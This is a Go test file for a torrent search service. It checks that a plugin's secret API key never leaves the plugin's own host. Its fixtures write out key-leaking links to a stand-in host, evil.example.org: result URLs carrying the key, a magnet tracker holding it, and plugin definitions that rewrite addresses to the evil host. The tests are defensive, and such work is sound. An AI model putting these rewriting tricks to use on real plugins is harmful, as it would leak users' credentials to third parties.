package search

import (
	"net/http"
	"net/url"
	"strings"
	"testing"
)

// keyedLinks is a json plugin on good.example.org with a secret key, whose
// result fields are given.
func keyedLinks(fields string) string {
	return `{"schema":1,"id":"site","name":"Site","type":"json",
		"request":{"url":"https://good.example.org/s?q={query}&key={setting:key}"},
		"settings":[{"id":"key","label":"Key","secret":true}],
		"response":{"items":"items","fields":{"title":"t",` + fields + `}}}`
}

// spec: a link of a result that carries a secret value goes nowhere but to
// the plugin's own host (or the administrator's Torznab server): no code
// to fetch it, no address shown, no tracker in a magnet link
func TestSecretLinksDropped(t *testing.T) {
	e := newAPIEnv(t)
	var evil []string
	e.n.handle("evil.example.org", func(w http.ResponseWriter, r *http.Request) {
		evil = append(evil, r.URL.String())
		w.Write([]byte(sampleTorrent))
	})
	e.n.handle("good.example.org", func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/s" {
			k := url.QueryEscape(r.URL.Query().Get("key"))
			w.Write([]byte(items(
				`{"t":"Elsewhere","u":"https://evil.example.org/dl?apikey=`+k+`"}`,
				`{"t":"Upper","u":"https://evil.example.org/dl?k=`+strings.ToUpper(k)+`","h":"`+hashA+`"}`,
				`{"t":"Own host","u":"https://good.example.org/dl?apikey=`+k+`"}`,
				`{"t":"Clean","u":"https://evil.example.org/clean.torrent"}`,
				`{"t":"Tracker","h":"`+strings.Replace(hashA, "6", "7", 1)+`","m":"magnet:?xt=urn:btih:`+strings.Replace(hashA, "6", "7", 1)+
					`&tr=`+url.QueryEscape("https://evil.example.org/announce?"+k)+`&tr=`+url.QueryEscape("udp://tracker.example.org:1337")+`"}`)))
			return
		}
		w.Write([]byte(sampleTorrent))
	})
	addPlugin(t, e.s, keyedLinks(`"torrent":"u","infohash":"h","magnet":"m"`), map[string]string{"key": "SECRET-KEY 1"})
	id, rs := apiSearch(t, e, "admin")
	if r := rs["Elsewhere"]; r != nil {
		t.Errorf("a result with nothing left: %v", r)
	}
	if r := rs["Upper"]; r == nil || r["ref"] != nil || r["torrent_url"] != nil {
		t.Errorf("upper case key: %v", r)
	}
	if r := rs["Own host"]; r == nil || r["ref"] == nil || r["torrent_url"] != nil {
		t.Errorf("own host: %v", r)
	} else if code, _, _ := e.call(t, "admin", "", "GET", "/search/"+id+"/torrent/"+r["ref"].(string), nil); code != 200 {
		t.Errorf("own host fetch: %d", code)
	}
	if r := rs["Clean"]; r == nil || r["ref"] == nil || r["torrent_url"] == nil {
		t.Errorf("clean: %v", r)
	}
	if r := rs["Tracker"]; r == nil || strings.Contains(r["magnet"].(string), "evil") || !strings.Contains(r["magnet"].(string), "tracker.example.org") {
		t.Errorf("tracker: %v", r)
	}
	// Every code there is: none reaches evil.example.org with the key
	for _, r := range rs {
		if ref, ok := r["ref"].(string); ok {
			e.call(t, "admin", "", "GET", "/search/"+id+"/torrent/"+ref, nil)
		}
	}
	for _, u := range evil {
		if strings.Contains(strings.ToLower(u), "secret") {
			t.Errorf("the key reached evil.example.org: %s", u)
		}
	}
}

// The reproductions: a definition that keeps the key while rewriting the
// result addresses to another host
func TestSecretLinksRewritten(t *testing.T) {
	e := newAPIEnv(t)
	var evil []string
	e.n.handle("evil.example.org", func(w http.ResponseWriter, r *http.Request) {
		evil = append(evil, r.URL.String())
		w.Write([]byte(sampleTorrent))
	})
	e.n.handle("good.example.org", func(w http.ResponseWriter, r *http.Request) {
		k := url.QueryEscape(r.URL.Query().Get("key"))
		w.Write([]byte(items(`{"t":"One","h":"` + hashA + `","u":"https://good.example.org/dl?apikey=` + k + `"}`)))
	})
	addPlugin(t, e.s, keyedLinks(`"torrent":"u","infohash":"h"`), map[string]string{"key": "SECRETKEY"})
	for name, fields := range map[string]string{
		"replace":  `"torrent":{"from":"u","replace":["https://good.example.org/","https://evil.example.org/"]},"infohash":"h"`,
		"template": `"infohash":"h","magnet":"magnet:?xt=urn:btih:{h}&tr=https://evil.example.org/announce?{u}"`,
	} {
		def := keyedLinks(fields)
		_, out, _ := e.call(t, "admin", "", "POST", "/search/plugins/inspect", map[string]any{"json": def})
		if out["keeps_settings"] != false {
			t.Errorf("%s: keeps the key: %v", name, out)
		}
		// Even with the key typed in again
		if code, out, _ := e.call(t, "admin", "", "POST", "/search/plugins", map[string]any{"json": def, "replace": true, "settings": map[string]string{"key": "SECRETKEY"}}); code != 200 {
			t.Fatalf("%s: %d %v", name, code, out)
		}
		on := true
		e.s.store.Update("site", &on, nil, nil)
		id, rs := apiSearch(t, e, "admin")
		r := rs["One"]
		if r == nil || r["ref"] != nil || r["torrent_url"] != nil || strings.Contains(strings.ToLower(r["magnet"].(string)), "secretkey") {
			t.Errorf("%s: %v", name, r)
		}
		for _, x := range rs {
			if ref, ok := x["ref"].(string); ok {
				e.call(t, "admin", "", "GET", "/search/"+id+"/torrent/"+ref, nil)
			}
		}
		// Back to the first definition
		e.call(t, "admin", "", "POST", "/search/plugins", map[string]any{"json": keyedLinks(`"torrent":"u","infohash":"h"`), "replace": true, "settings": map[string]string{"key": "SECRETKEY"}})
	}
	for _, u := range evil {
		if strings.Contains(strings.ToLower(u), "secretkey") {
			t.Errorf("the key reached evil.example.org: %s", u)
		}
	}
}

// spec: the same shape includes the result addresses and the whole
// request address: another path on the same host is another source
func TestShapeIncludesPathAndLinks(t *testing.T) {
	base := keyedLinks(`"torrent":"u","infohash":"h"`)
	p1, _ := ParseCustom([]byte(base))
	for name, def := range map[string]string{
		"other path":    strings.Replace(base, "https://good.example.org/s?", "https://good.example.org/other/s?", 1),
		"other param":   strings.Replace(base, "&key={setting:key}", "&token={setting:key}", 1),
		"torrent":       strings.Replace(base, `"torrent":"u"`, `"torrent":"v"`, 1),
		"replace":       strings.Replace(base, `"torrent":"u"`, `"torrent":{"from":"u","replace":["a","b"]}`, 1),
		"magnet":        strings.Replace(base, `"torrent":"u"`, `"torrent":"u","magnet":"m"`, 1),
		"page":          strings.Replace(base, `"torrent":"u"`, `"torrent":"u","page":"p"`, 1),
		"page template": strings.Replace(base, `"torrent":"u"`, `"torrent":"u","page":"https://x.example.org/{p}"`, 1),
	} {
		p2, err := ParseCustom([]byte(def))
		if err != nil {
			t.Fatalf("%s: %v", name, err)
		}
		if sameShape(p1, p2) {
			t.Errorf("%s: same shape", name)
		}
	}
	for name, def := range map[string]string{
		"version":   strings.Replace(base, `"name":"Site"`, `"name":"Site","version":"2"`, 1),
		"title":     strings.Replace(base, `"title":"t"`, `"title":"name"`, 1),
		"host case": strings.Replace(base, "good.example.org", "GOOD.example.org", 1),
	} {
		p2, err := ParseCustom([]byte(def))
		if err != nil {
			t.Fatalf("%s: %v", name, err)
		}
		if !sameShape(p1, p2) {
			t.Errorf("%s: not the same shape", name)
		}
	}
}
